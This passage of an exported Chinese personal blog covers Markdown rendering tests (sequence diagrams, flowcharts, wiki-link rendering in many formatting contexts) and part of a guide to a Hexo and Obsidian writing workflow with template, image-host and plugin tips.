对象A-&gt;对象B: 你真的好吗？
</code></pre>
<h3>UML 标准时序图复杂</h3>
<pre><code class="language-sequence">Title: 标题：复杂使用
对象A-&gt;对象B: 对象B你好吗?（请求）
Note right of 对象B: 对象B的描述
Note left of 对象A: 对象A的描述(提示)
对象B--&gt;对象A: 我很好(响应)
对象B-&gt;小三: 你好吗
小三--&gt;&gt;对象A: 对象B找我了
对象A-&gt;对象B: 你真的好吗？
Note over 小三,对象B: 我们是朋友
participant C
Note right of C: 没人陪我玩
</code></pre>
<h2>flow 图</h2>
<p>流程图代码分两块，上面一块是创建你的流程（创建元素），然后隔一行，创建流程的走向 (连接元素)。</p>
<ul>
<li>创建流程（元素）：tag=&gt;type: content:&gt;url
<ul>
<li>tag 是流程图中的标签，在第二段连接元素时会用到。名称可以任意，一般为流程的英文缩写和数字的组合。</li>
<li>type 用来确定标签的类型，<code>=&gt;</code> 后面表示类型。由于标签的名称可以任意指定，所以要依赖 type 来确定标签的类型（start、end、operation、subroutine、condition、inputoutput）</li>
<li>content 是流程图文本框中的描述内容，<code>:</code> 后面表示内容，中英文均可。特别注意，<strong>冒号与文本之间一定要有个空格</strong></li>
<li>url 是一个连接，与框框中的文本相绑定，<code>:&gt;</code> 后面就是对应的 url 链接，点击文本时可以通过链接跳转到 url 指定页面</li>
</ul>
</li>
<li>指向流程 (连接元素)：标识（类别）-&gt;下一个标识
<ul>
<li>使用 -&gt; 来连接两个元素</li>
<li>对于 condition 类型，有 yes 和 no 两个分支，如示例中的 cond(yes) 和 cond(no)</li>
<li>每个元素可以制定分支走向，默认向下，也可以用 right 指向右边，如示例中 cond2(yes,right)。</li>
</ul>
</li>
</ul>
<p>【提示】Obsidian 不支持。</p>
<h3>标准流程图（横向）</h3>
<pre><code class="language-flow">st=&gt;start: 开始框
op=&gt;operation: 处理框
cond=&gt;condition: 判断框(是或否?)
sub1=&gt;subroutine: 子流程
io=&gt;inputoutput: 输入输出框
e=&gt;end: 结束框
st(right)-&gt;op(right)-&gt;cond
cond(yes)-&gt;io(bottom)-&gt;e
cond(no)-&gt;sub1(right)-&gt;op
</code></pre>
<h3>标准流程图</h3>
<pre><code class="language-flow">st=&gt;start: 开始框
op=&gt;operation: 处理框
cond=&gt;condition: 判断框(是或否?)
sub1=&gt;subroutine: 子流程
io=&gt;inputoutput: 输入输出框
e=&gt;end: 结束框
st-&gt;op-&gt;cond
cond(yes)-&gt;io-&gt;e
cond(no)-&gt;sub1(right)-&gt;op
</code></pre>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3569112562">
                            <a href="#3569112562">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客适配 Obsidian 新语法</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^gfm]: Markdown 相关语法规范详见 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
<p>更多渲染情况详见本站渲染调试页：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1982369523">
                            <a href="#1982369523">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>双链渲染测试</span>
                                
                                <div class="record-links-context hover">
                                    <p>这篇文章展示双链渲染测试效果。本文测试的链接为：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a>。</p>
<h2>双链 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></h2>
<h3>双链 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></h3>
<h4>双链 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></h4>
<p>正文：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a>。</p>
<p>粗体内：<strong>这是一 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a> 段文字</strong>。</p>
<p>斜体内：<em>这是一 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a> 段文字。</em></p>
<p>行内代码不应该渲染：<code>code &lt;a href=&quot;#1011516134&quot; title=&quot;Markdown 渲染测试&quot; class=&quot;record-link highlight&quot;&gt;Markdown 渲染测试&lt;/a&gt; code</code></p>
<p>行内公式不应该渲染：$a+a=2a~<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a> ~ b*b=b^2$</p>
<p>链接内不应该渲染，格式怪怪的：<a href="https://uuanqin.top">链接 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a> 文字</a></p>
<p>图片内描述文字可以渲染（Hexo Butterfly 主题显示得不错）：<img src="https://commonmark.org/help/images/favicon.png" alt="链接Markdown 渲染测试文字"></p>
<ul>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a>
<ul>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></li>
</ul>
</li>
</ul>
<ol>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a>
<ol>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></li>
</ol>
</li>
</ol>
<blockquote>
<p>引言块 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
<blockquote>
<p>嵌套引言块：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
<blockquote>
<p>嵌套引言块：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
</blockquote>
</blockquote>
</blockquote>
<pre><code class="language-java">&lt;a href=&quot;#1011516134&quot; title=&quot;Markdown 渲染测试&quot; class=&quot;record-link highlight&quot;&gt;Markdown 渲染测试&lt;/a&gt;
</code></pre>
<p>$$<br>
<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a><br>
$$</p>
<table>
<thead>
<tr>
<th>表格渲染</th>
<th><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></th>
</tr>
</thead>
<tbody>
<tr>
<td>单元格</td>
<td><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></td>
</tr>
</tbody>
</table>
<details><summary>HTML折叠  <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a> </summary>
<p>
<table><tbody>
    <tr>
        <th rowspan="3">HTML表格</th>
        <th><font color="Green"><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></font></th>
        <th>第二列</th>
        <th>第三列</th>
    </tr>
    <tr>
        <td bgcolor="Tomato">第一列</td>
        <td><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></td>
        <td>第三列</td>
    </tr>
    <tr>
        <td>第一列</td>
        <td>第二列</td>
        <td><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></td>
    </tr>
</table>
<blockquote>
<p>[!note] 标题：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a><br>
正文：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
<blockquote>
<p>[!warning] 嵌套 Callout：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a><br>
<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
</blockquote>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1982369523" class="record">
            <header>
                <h1 class="record-title">双链渲染测试</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('源码案例驱动');">源码案例驱动</button>
                    
                    <button class="btn" onclick="activeTag('Markdown');">Markdown</button>
                    
                    <button class="btn" onclick="activeTag('Typora');">Typora</button>
                    
                    <button class="btn" onclick="activeTag('GFM');">GFM</button>
                    
                    <button class="btn" onclick="activeTag('OFM');">OFM</button>
                    
                    <button class="btn" onclick="activeTag('Obsidian');">Obsidian</button>
                    
                    <button class="btn" onclick="activeTag('Github');">Github</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>6/1/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/202408031543869.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>对双链效果的渲染进行测试。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>76288ef3</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>这篇文章展示双链渲染测试效果。本文测试的链接为：<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a>。</p>
<p>这里推广一下我写的插件：<a href="https://github.com/uuanqin/hexo-filter-titlebased-link">uuanqin/hexo-filter-titlebased-link: Transfer wiki links (based on the title) in Markdown files to permalink. 将基于标题的双向链接转换为 Hexo 设定的永久链接。 (github.com)</a></p>
<p>相关文章推荐：</p>
<ul>
<li><a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a></li>
<li><a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link ">构建 Obsidian 的 Hexo 写作工作流</a></li>
</ul>
<h1>标题内双链测试</h1>
<h2>双链 <a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></h2>
<h3>双链 <a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></h3>
<h4>双链 <a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></h4>
<h1>文字样式双链测试</h1>
<p>正文：<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a>。</p>
<p>粗体内：<strong>这是一 <a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a> 段文字</strong>。</p>
<p>斜体内：<em>这是一 <a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a> 段文字。</em></p>
<p>行内代码不应该渲染：<code>code &lt;a href=&quot;#1011516134&quot; title=&quot;Markdown 渲染测试&quot; class=&quot;record-link &quot;&gt;Markdown 渲染测试&lt;/a&gt; code</code></p>
<p>行内公式不应该渲染：$a+a=2a~<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a> ~ b*b=b^2$</p>
<p>链接内不应该渲染，格式怪怪的：<a href="https://uuanqin.top">链接 <a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a> 文字</a></p>
<p>图片内描述文字可以渲染（Hexo Butterfly 主题显示得不错）：<img src="https://commonmark.org/help/images/favicon.png" alt="链接Markdown 渲染测试文字"></p>
<h1>列表双链测试</h1>
<p>列表：</p>
<ul>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a>
<ul>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></li>
</ul>
</li>
</ul>
<ol>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a>
<ol>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></li>
</ol>
</li>
</ol>
<ul>
<li>[ ] 任务列表 <a href="#1982369523" title="双链渲染测试" class="record-link ">双链渲染测试</a>
<ul>
<li>[x] <a href="#1982369523" title="双链渲染测试" class="record-link ">双链渲染测试</a></li>
</ul>
</li>
</ul>
<h1>块状格式渲染测试</h1>
<blockquote>
<p>引言块 <a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></p>
<blockquote>
<p>嵌套引言块：<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></p>
<blockquote>
<p>嵌套引言块：<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></p>
</blockquote>
</blockquote>
</blockquote>
<p>代码块不应该有渲染：</p>
<pre><code class="language-java">&lt;a href=&quot;#1011516134&quot; title=&quot;Markdown 渲染测试&quot; class=&quot;record-link &quot;&gt;Markdown 渲染测试&lt;/a&gt;
</code></pre>
<p>公式里不应该有渲染：</p>
<p>$$<br>
<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a><br>
$$</p>
<table>
<thead>
<tr>
<th>表格渲染</th>
<th><a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></th>
</tr>
</thead>
<tbody>
<tr>
<td>单元格</td>
<td><a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></td>
</tr>
</tbody>
</table>
<details><summary>HTML折叠  <a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a> </summary>
<p>
<h4>We can hide anything, even code!</h4>
<p>正文：<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a>。</p>
<p>粗体内：<strong>这是一 <a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a> 段文字</strong>。</p>
<p>斜体内：<em>这是一 <a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a> 段文字。</em></p>
</p>
</details>
<table><tbody>
    <tr>
        <th rowspan="3">HTML表格</th>
        <th><font color="Green"><a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></font></th>
        <th>第二列</th>
        <th>第三列</th>
    </tr>
    <tr>
        <td bgcolor="Tomato">第一列</td>
        <td><a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></td>
        <td>第三列</td>
    </tr>
    <tr>
        <td>第一列</td>
        <td>第二列</td>
        <td><a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></td>
    </tr>
</table>
<h1>Callout 块渲染测试</h1>
<blockquote>
<p>[!note] 标题：<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a><br>
正文：<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></p>
<blockquote>
<p>[!warning] 嵌套 Callout：<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a><br>
<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></p>
</blockquote>
</blockquote>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="85495977">
                            <a href="#85495977">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>构建 Obsidian 的 Hexo 写作工作流</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a></li>
<li><a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link highlight">构建 Obsidian 的 Hexo 写作工作流</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1011516134">
                            <a href="#1011516134">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Markdown 渲染测试</span>
                                
                                <div class="record-links-context hover">
                                    <p>这篇文章展示双链渲染测试效果。本文测试的链接为：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a>。</p>
<h2>双链 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></h2>
<h3>双链 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></h3>
<h4>双链 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></h4>
<p>正文：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a>。</p>
<p>粗体内：<strong>这是一 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a> 段文字</strong>。</p>
<p>斜体内：<em>这是一 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a> 段文字。</em></p>
<p>行内代码不应该渲染：<code>code &lt;a href=&quot;#1011516134&quot; title=&quot;Markdown 渲染测试&quot; class=&quot;record-link highlight&quot;&gt;Markdown 渲染测试&lt;/a&gt; code</code></p>
<p>行内公式不应该渲染：$a+a=2a~<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a> ~ b*b=b^2$</p>
<p>链接内不应该渲染，格式怪怪的：<a href="https://uuanqin.top">链接 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a> 文字</a></p>
<p>图片内描述文字可以渲染（Hexo Butterfly 主题显示得不错）：<img src="https://commonmark.org/help/images/favicon.png" alt="链接Markdown 渲染测试文字"></p>
<ul>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a>
<ul>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></li>
</ul>
</li>
</ul>
<ol>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a>
<ol>
<li><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></li>
</ol>
</li>
</ol>
<blockquote>
<p>引言块 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
<blockquote>
<p>嵌套引言块：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
<blockquote>
<p>嵌套引言块：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
</blockquote>
</blockquote>
</blockquote>
<pre><code class="language-java">&lt;a href=&quot;#1011516134&quot; title=&quot;Markdown 渲染测试&quot; class=&quot;record-link highlight&quot;&gt;Markdown 渲染测试&lt;/a&gt;
</code></pre>
<p>$$<br>
<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a><br>
$$</p>
<table>
<thead>
<tr>
<th>表格渲染</th>
<th><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></th>
</tr>
</thead>
<tbody>
<tr>
<td>单元格</td>
<td><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></td>
</tr>
</tbody>
</table>
<details><summary>HTML折叠  <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a> </summary>
<p>
<table><tbody>
    <tr>
        <th rowspan="3">HTML表格</th>
        <th><font color="Green"><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></font></th>
        <th>第二列</th>
        <th>第三列</th>
    </tr>
    <tr>
        <td bgcolor="Tomato">第一列</td>
        <td><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></td>
        <td>第三列</td>
    </tr>
    <tr>
        <td>第一列</td>
        <td>第二列</td>
        <td><a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></td>
    </tr>
</table>
<blockquote>
<p>[!note] 标题：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a><br>
正文：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
<blockquote>
<p>[!warning] 嵌套 Callout：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a><br>
<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
</blockquote>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1982369523">
                            <a href="#1982369523">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>双链渲染测试</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li>[ ] 任务列表 <a href="#1982369523" title="双链渲染测试" class="record-link highlight">双链渲染测试</a>
<ul>
<li>[x] <a href="#1982369523" title="双链渲染测试" class="record-link highlight">双链渲染测试</a></li>
</ul>
</li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3569112562">
                            <a href="#3569112562">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客适配 Obsidian 新语法</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a></li>
<li><a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link ">构建 Obsidian 的 Hexo 写作工作流</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3569112562">
                            <a href="#3569112562">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客适配 Obsidian 新语法</span>
                                
                                <div class="record-links-context hover">
                                    <p>渲染效果详见本站的测试页：<a href="#1982369523" title="双链渲染测试" class="record-link highlight">双链渲染测试</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1982369523">
                            <a href="#1982369523">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>双链渲染测试</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li>[ ] 任务列表 <a href="#1982369523" title="双链渲染测试" class="record-link highlight">双链渲染测试</a>
<ul>
<li>[x] <a href="#1982369523" title="双链渲染测试" class="record-link highlight">双链渲染测试</a></li>
</ul>
</li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="85495977" class="record">
            <header>
                <h1 class="record-title">构建 Obsidian 的 Hexo 写作工作流</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Typora');">Typora</button>
                    
                    <button class="btn" onclick="activeTag('Obsidian');">Obsidian</button>
                    
                    <button class="btn" onclick="activeTag('Hexo');">Hexo</button>
                    
                    <button class="btn" onclick="activeTag('Markdown');">Markdown</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>6/1/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/hexoobsidian-cowork.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>切换到Obsidian写作的快速指南</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>51890a9</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!success] 本文已收录至 <a href="https://butterfly.zhheo.com/">Butterfly 主题美化教程</a></p>
</blockquote>
<h1>为什么选择 Obsidian</h1>
<p>放弃 Typora 的理由：</p>
<ul>
<li>Typora 已经收费，目前使用的免费版本已长久不更新，且偶尔出现 Bug。</li>
<li>Typora 适合关注于一个 Markdown 文件，不适合文件之间的链接与知识库管理。对于博客或笔记来说，互相链接将有助于加强内容联系，形成自己的知识体系</li>
<li>插件？没听说过也没用过</li>
</ul>
<p>选择 Obsidian：</p>
<ul>
<li>关注于知识库的整理，有双向链接的特色</li>
<li>Obsidian 对个人用户免费（也有付费方案）并时常维护</li>
<li>有活跃的社区和第三方插件市场</li>
<li>半 WYSIWYG，写文档不至于预览困难</li>
<li>在于博客框架 Hexo 协同工作中有潜力</li>
<li>不影响 Markdown 核心语法的情况下也有很多提高编写效率插件</li>
</ul>
<p>下文将介绍如何无缝把写作工具迁移到 Obsidian 中。</p>
<h1>写作习惯继承及效率提升</h1>
<h2>快捷键——指尖习惯复刻</h2>
<p>一些快捷键先设置好：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230602001347.png" alt="image.png"></p>
<p>Ctrl + num 的快捷键 Obsidian 给了跳转，刚好 Ctrl + Alt + num 的小标题设置快捷键符合主流编辑器的设置。Typora 的快捷键有点反人类。</p>
<h2>文章模板——免写 Font-Matter 或在 Hexo 中敲命令</h2>
<p>Obsidian 新建文章时可以快速使用模板。</p>
<p>打开设置 -&gt;模板，插入模板文件夹位置（巧合的是，Hexo 有专门放模板的地方，scaffolds。不过这个需要自己创建，详情查看这篇文章 <a href="https://hexo.io/zh-cn/docs/writing#%E6%A8%A1%E7%89%88%EF%BC%88Scaffold%EF%BC%89">写作 | Hexo</a></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230601235734.png" alt="image.png"></p>
<p>一般 scaffolds 文件夹包含这三个 Markdown 文件：</p>
<ul>
<li>draft</li>
<li>page</li>
<li>post</li>
</ul>
<p>它们分别对应不同的模板。</p>
<p>post 可以这样写：</p>
<pre><code class="language-markdown">	---
	title: 
	date: {{date}} {{time}}
	tags:
	category:
	cover:
	description:
	top_img:
	---
</code></pre>
<p>安装相关插件后 <code>category</code> 还可以免写，后文将提到。</p>
<p>因此创建新文章的流程就是：</p>
<ol>
<li>新建页面</li>
<li>输入标题</li>
<li>点击 Obsidian 左侧的模板按钮</li>
<li>选择响应的模板即可</li>
</ol>
<p>当然，可以使用 hexo 原生命令。但是由于模板更改可能还需手动修改部分内容。</p>
<h2>图床——和 Typora 图片上传方法一致 易嵌入</h2>
<p>配置好 PicGo 图床后 [^图床配置教程]，安装 Obsidian 第三方插件：<a href="https://github.com/renmu123/obsidian-image-auto-upload-plugin">renmu123/obsidian-image-auto-upload-plugin: auto upload image with picgo (github.com)</a>，记得还要点一下启用插件。</p>
<p>依照说明进行配置 PicGo。然后试着上传图片就行。</p>
<p>[^图床配置教程]: <a href="#3992879191" title="PicGo(app) 配置腾讯云 COS 图床" class="record-link ">PicGo(app) 配置腾讯云 COS 图床</a></p>
<h2>文件夹分类——省去手写相关 Font-Matter</h2>
<p>Hexo 中安装这个插件即可：<a href="https://github.com/xu-song/hexo-auto-category">xu-song/hexo-auto-category: Generate categories automatically for each post in Hexo (github.com)</a></p>
<h2>Obsidian 第三方插件——用更少的时间写 Markdown</h2>
<p>以下插件不会对 Markdown 核心语法造成影响、不会引入奇奇怪怪的语句，但它们可以提升你的写作速度，或以更少的时间排版出更好的版面。</p>
<p>使用此插件可以更方便绘制 Markdown 表格（准确来说属于 GFM）：<a href="https://github.com/tgrosinger/advanced-tables-obsidian">tgrosinger/advanced-tables-obsidian: Improved table navigation, formatting, and manipulation in Obsidian.md (github.com)</a> 至少我觉得比 Typora 鼠标点来点去方便</p>
<p>文本规范化插件：</p>
<ul>
<li>中英文之间迅速加空格，满足文字洁癖党：<a href="https://github.com/Natumsol/obsidian-pangu">Natumsol/obsidian-pangu: 为 Obsidian 笔记加上「盘古之白」，排版强迫症者的福音。 </a></li>
<li>比盘古更强大：<a href="https://github.com/platers/obsidian-linter">platers/obsidian-linter: An Obsidian plugin that formats and styles your notes with a focus on configurability and extensibility. (github.com)</a></li>
</ul>
<p>让列表支持鼠标拖动以及键盘顺畅调整：<a href="https://github.com/vslinko/obsidian-outliner">vslinko/obsidian-outliner: Work with your lists like in Workflowy or RoamResearch (github.com)</a></p>
<p>选中文字可直接复制网址：<a href="https://github.com/denolehov/obsidian-url-into-selection">denolehov/obsidian-url-into-selection: Paste URLs into selected text &quot;notion style&quot; (github.com)</a></p>
<h1>Hexo 与 Obsidian 的所见即所得</h1>
<p>其实做到上面的内容后，使用原先 Markdown 语法写作就可以了。在基本的 Markdown 写作之上，我们可能还有更多的语法、样式、功能需求。如果能将 <strong>Obsidian 里看到的</strong>和 <strong>Hexo 博客网页中看到的</strong>基本达成一致，那么我们的写作习惯进行统一，并可将其语法的运用纳入到我们长期的使用习惯中。</p>
